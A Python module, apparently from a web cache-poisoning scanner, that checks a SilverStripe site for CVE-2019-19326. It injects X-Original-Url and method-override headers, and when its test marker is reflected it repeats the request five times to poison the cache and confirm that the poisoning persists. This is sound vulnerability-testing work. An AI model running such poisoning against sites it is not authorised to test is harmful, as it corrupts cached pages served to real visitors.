#!/usr/bin/env python3

"""
https://www.silverstripe.org/download/security-releases/cve-2019-19326/
https://docs.silverstripe.org/en/3/changelogs/3.7.5/
"""


from utils.style import Colors, Identify
from utils.utils import (
    BIG_CONTENT_DELTA_RANGE,
    CONTENT_DELTA_RANGE,
    configure_logger,
    requests,
    sys,
)

logger = configure_logger(__name__)


def silverstripe(
    url: str,
    s: requests.Session,
    req_main: requests.Response,
    custom_header: dict,
    authent: tuple[str, str] | None,
) -> None:
    """
    Détecte CVE-2019-19326 (SilverStripe cache poisoning via X-Original-URL)
    """
    main_len = len(req_main.content)
    test_marker = "x-cve-test-silverstripe"
    headers = {
        "X-Original-Url": test_marker,
        "X-HTTP-Method-Override": "POST"
    }
    
    try:
        # Requête avec headers malveillants
        req = s.get(
            url,
            verify=False,
            auth=authent,
            headers=headers,
            timeout=10,
            allow_redirects=False,
        )
        len_req = len(req.content)

        # Calcul de la plage d'exclusion pour content-length
        range_exclusion = (
            range(main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE)
            if main_len < 10000
            else range(
                main_len - BIG_CONTENT_DELTA_RANGE, main_len + BIG_CONTENT_DELTA_RANGE
            )
        )

        # Vérification 1: Marqueur reflété dans réponse ou headers
        if test_marker in req.text or test_marker in str(req.headers):
            print(
                f" {Identify.behavior} | CVE-2019-19326 | TAG OK | {Colors.BLUE}{url}{Colors.RESET} | PAYLOAD: {headers}"
            )
            
            # Empoisonnement du cache
            for _ in range(5):
                s.get(
                    url,
                    verify=False,
                    auth=authent,
                    headers=headers,
                    timeout=10,
                    allow_redirects=False,
                )
            
            # Vérification de persistence du cache
            req_verify = s.get(
                url, verify=False, auth=authent, timeout=10, allow_redirects=False
            )
            
            if test_marker in req_verify.text or test_marker in str(req_verify.headers):
                print(
                    f" {Identify.confirmed} | CVE-2019-19326 | CACHE POISONED | {Colors.BLUE}{url}{Colors.RESET}"
                )
        
        # Vérification 2: Différence de content-length
        elif (
            len_req not in range_exclusion
            and req.status_code not in [403, 429, 301, 302]
        ):
            print(
                f" {Identify.behavior} | CVE-2019-19326 | {Colors.BLUE}{url}{Colors.RESET} | DIFFERENT RESPONSE LENGTH {main_len}b > {len_req}b | PAYLOAD: {headers}"
            )
        
        # Vérification 3: Différence de status code
        elif (
            req.status_code != req_main.status_code
            and req.status_code not in [403, 429]
        ):
            print(
                f" {Identify.behavior} | CVE-2019-19326 | {Colors.BLUE}{url}{Colors.RESET} | DIFFERENT STATUS-CODE | {req_main.status_code} > {req.status_code} | PAYLOAD: {headers}"
            )
            
    except requests.Timeout as t:
        logger.error(f"request timeout {url}: {t}")
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        logger.exception(f"Error testing CVE-2019-19326 on {url}: {e}")